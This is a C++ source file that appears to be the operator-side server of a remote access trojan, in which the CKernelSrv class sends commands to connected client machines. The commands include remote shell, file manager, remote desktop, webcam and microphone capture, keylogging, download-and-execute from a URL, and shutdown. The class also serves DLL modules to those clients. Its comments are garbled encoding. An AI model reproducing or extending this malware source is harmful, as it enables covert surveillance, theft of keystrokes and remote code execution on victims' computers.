#include "stdafx.h"
#include "KernelSrv.h"
#include "ClientList.h"


CKernelSrv::CKernelSrv(HWND hClientList, DWORD Identity) :
CEventHandler(Identity)
{
	m_hClientList = hClientList;
}


CKernelSrv::~CKernelSrv()
{
}

void CKernelSrv::OnClose()
{
	//�ͻ��˳�,֪ͨ�Ƴ�
	SendMessage(m_hClientList, WM_CLIENT_LOGOUT, (WPARAM)this, 0);
}
void CKernelSrv::OnConnect()
{
	//һ�й���׼������.���Կ�ʼ������
	Send(KNEL_READY, 0, 0);
}
//.

void CKernelSrv::OnReadComplete(WORD Event, DWORD Total, DWORD nRead, char*Buffer)
{
	switch (Event)
	{
	case KNEL_LOGIN:
		OnLogin((LoginInfo*)Buffer);
		break;
	case KNEL_EDITCOMMENT_OK:
		SendMessage(m_hClientList, WM_CLIENT_EDITCOMMENT, (WPARAM)this, (LPARAM)Buffer);
		break;
	case KNEL_MODULE_BUSY:
		OnModuleBusy();
		break;
	case KNEL_GETMODULE:
		OnGetModule(Buffer);
		break;
	default:
		break;
	}
}



void CKernelSrv::Power_Reboot()
{
	Send(KNEL_POWER_REBOOT, 0, 0);
}
void CKernelSrv::Power_Shutdown()
{
	Send(KNEL_POWER_SHUTDOWN, 0, 0);
}
void CKernelSrv::EditComment(WCHAR*Comment)
{
	Send(KNEL_EDITCOMMENT, (char*)Comment,sizeof(WCHAR)*( wcslen(Comment) + 1));
}

void CKernelSrv::Restart()
{
	Send(KNEL_RESTART, 0, 0);
}

void CKernelSrv::UploadModuleFromDisk(WCHAR* Path)
{
	Send(KNEL_UPLOAD_MODULE_FROMDISK, (char*)Path, sizeof(WCHAR)*(wcslen(Path) + 1));
}

void CKernelSrv::UploadModuleFromUrl(WCHAR* Url)
{
	Send(KNEL_UPLOAD_MODULE_FORMURL, (char*)Url,  sizeof(WCHAR)*(wcslen(Url) + 1));
}
void CKernelSrv::BeginCmd()
{
	Send(KNEL_CMD, 0, 0);
}
void CKernelSrv::BeginChat()
{
	Send(KNEL_CHAT, 0, 0);
}
void CKernelSrv::OnModuleBusy()
{
	MessageBox(NULL, L"Kernel is busy", L"Tips", MB_OK);
}
void CKernelSrv::BeginFileMgr()
{
	Send(KNEL_FILEMGR, 0, 0);
}

void CKernelSrv::BeginRemoteDesktop()
{
	Send(KNEL_DESKTOP, 0, 0);
}

void CKernelSrv::BeginCamera()
{
	Send(KNEL_CAMERA, 0, 0);
}

void CKernelSrv::BeginMicrophone()
{
	Send(KNEL_MICROPHONE, 0, 0);
}

void CKernelSrv::BeginDownloadAndExec(WCHAR szUrl[])
{
	Send(KNEL_DOWNANDEXEC, (char*)szUrl, (sizeof(WCHAR)*(wcslen(szUrl) + 1)));
}

void CKernelSrv::BeginExit(){
	Send(KNEL_EXIT, 0, 0);
}

void CKernelSrv::BeginKeyboardLog(){
	Send(KNEL_KEYBD_LOG, 0, 0);
}


void CKernelSrv::OnLogin(LoginInfo *pLi){
	
	SendMessage(m_hClientList, WM_CLIENT_LOGIN, (WPARAM)this, (LPARAM)pLi);
}

void CKernelSrv::OnGetModule(const char*ModuleName){
	//
	CString FileName = L"modules\\";
	DWORD dwFileSizeLow = NULL;
	LPVOID lpBuffer = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwRead = 0;

	FileName += CA2W(ModuleName);
	FileName += L".dll";

	hFile = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE){
		Send(KNEL_MODULE, 0, 0);
		return;
	}
	dwFileSizeLow = GetFileSize(hFile, NULL);
	lpBuffer = VirtualAlloc(NULL, dwFileSizeLow, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpBuffer && ReadFile(hFile, lpBuffer, dwFileSizeLow, &dwRead, NULL)&&
		dwRead == dwFileSizeLow){
		Send(KNEL_MODULE, (char*)lpBuffer, dwRead);
	}
	else{
		Send(KNEL_MODULE, 0, 0);
	}
	if (lpBuffer){
		VirtualFree(lpBuffer, dwFileSizeLow, MEM_RELEASE);
		lpBuffer = NULL;
	}
	CloseHandle(hFile);
}